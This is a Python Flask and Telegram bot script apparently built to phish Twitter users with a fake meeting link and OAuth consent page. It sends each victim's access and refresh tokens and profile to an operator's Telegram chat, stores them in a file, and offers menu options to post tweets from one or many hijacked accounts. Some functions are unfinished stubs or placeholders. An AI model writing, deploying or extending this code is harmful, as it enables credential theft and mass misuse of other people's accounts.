import base64
import hashlib
import os
import requests
import time
from flask import Flask, redirect, request, session, render_template
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, CallbackQueryHandler, Updater, MessageHandler, Filters

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = 'https://gifter-7vz7.onrender.com/'  # Update with your callback URL
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Initialize Telegram Bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)
updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher


def save_tokens_to_file(access_token, refresh_token):
    with open('tokens.txt', 'a') as file:
        file.write(f"{access_token},{refresh_token}\n")


def load_tokens():
    tokens = []
    if os.path.exists('tokens.txt'):
        with open('tokens.txt', 'r') as file:
            tokens = [line.strip().split(',') for line in file if line.strip()]
    return tokens


def get_total_tokens():
    return len(load_tokens())


def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        username = data.get("data", {}).get("username")
        return username
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None


# Generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge


# Function to send a startup message with OAuth link and meeting link
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()

    # Generate the OAuth link
    authorization_url = CALLBACK_URL

    # Generate the meeting link
    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    # Message content
    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )

    # Send the message to Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)


# Function to send access and refresh tokens to Telegram
def send_to_telegram(access_token, refresh_token=None):
    alert_emoji = "🚨"
    key_emoji = "🔑"

    # Get the username from the access token
    username = get_twitter_username(access_token)
    if username:
        twitter_url = f"https://twitter.com/{username}"
    else:
        twitter_url = "Unknown user"

    total_tokens = get_total_tokens()

    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
    message += f"🧮 *Total Available Tokens:* {total_tokens}\n"

    if refresh_token:
        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"

    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"  # Include username and profile link

    # Save tokens to file
    save_tokens_to_file(access_token, refresh_token)

    # Send the message to Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"  # To format the message
    }
    requests.post(url, json=data)


# Telegram Bot Commands
def start(update, context):
    keyboard = [
        [InlineKeyboardButton("Refresh All Tokens", callback_data='refresh_all')],
        [InlineKeyboardButton("Post (Single Token)", callback_data='post_single')],
        [InlineKeyboardButton("Post (Bulk Tokens)", callback_data='post_bulk')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Choose an option:', reply_markup=reply_markup)


def button(update, context):
    query = update.callback_query
    query.answer()

    if query.data == 'refresh_all':
        query.edit_message_text(text="Refreshing all tokens...")
        refresh_all_tokens()
    elif query.data == 'post_single':
        query.edit_message_text(text="Posting with a single token. Please enter your message:")
        context.user_data['post_mode'] = 'single'
    elif query.data == 'post_bulk':
        query.edit_message_text(text="Enter the number of tokens to use for posting:")
        context.user_data['post_mode'] = 'bulk'


def handle_message(update, context):
    user_message = update.message.text
    post_mode = context.user_data.get('post_mode')

    if post_mode == 'single':
        # Post with a single token
        post_with_single_token(user_message)
    elif post_mode == 'bulk':
        # Bulk posting
        try:
            num_tokens = int(user_message)
            context.user_data['num_tokens'] = num_tokens
            update.message.reply_text(f"Using {num_tokens} tokens. Now, please enter the message content:")
        except ValueError:
            update.message.reply_text("Please enter a valid number.")


def refresh_all_tokens():
    tokens = load_tokens()
    refreshed_count = 0

    for access_token, refresh_token in tokens:
        # Logic to refresh the token using refresh_token
        # Example: Assume a new_access_token is obtained
        new_access_token = access_token  # Placeholder, replace with actual token refresh logic
        new_refresh_token = refresh_token

        # Save the new tokens
        save_tokens_to_file(new_access_token, new_refresh_token)
        refreshed_count += 1

    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.")


def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "text": tweet_text
    }

    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)

    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"


def post_with_single_token(message):
    tokens = load_tokens()
    if tokens:
        access_token, _ = tokens[0]  # Pick the first token for simplicity
        result = post_tweet(access_token, message)
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
    else:
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="No tokens available.")


def post_with_bulk_tokens(message, num_tokens):
    tokens = load_tokens()
    if tokens and num_tokens <= len(tokens):
        for i in range(num_tokens):
            access_token, _ = tokens[i]
            result = post_tweet(access_token, message)
            bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f"{result}")
            time.sleep(5)  # Delay between posts
    else:
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Not enough tokens available.")


# Set up command handlers
start_handler = CommandHandler('start', start)
message_handler = MessageHandler(Filters.text & ~Filters.command, handle_message)  # Filters import is from telegram.ext
dispatcher.add_handler(start_handler)
dispatcher.add_handler(message_handler)
dispatcher.add_handler(CallbackQueryHandler(button))

# Flask Routes for OAuth and Token Management
@app.route('/')
def home():
    # Existing home function
    pass

# Run the bot
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send the startup message with OAuth and meeting links
    updater.start_polling()  # Start the Telegram bot polling
    app.run(host='0.0.0.0', port=port)
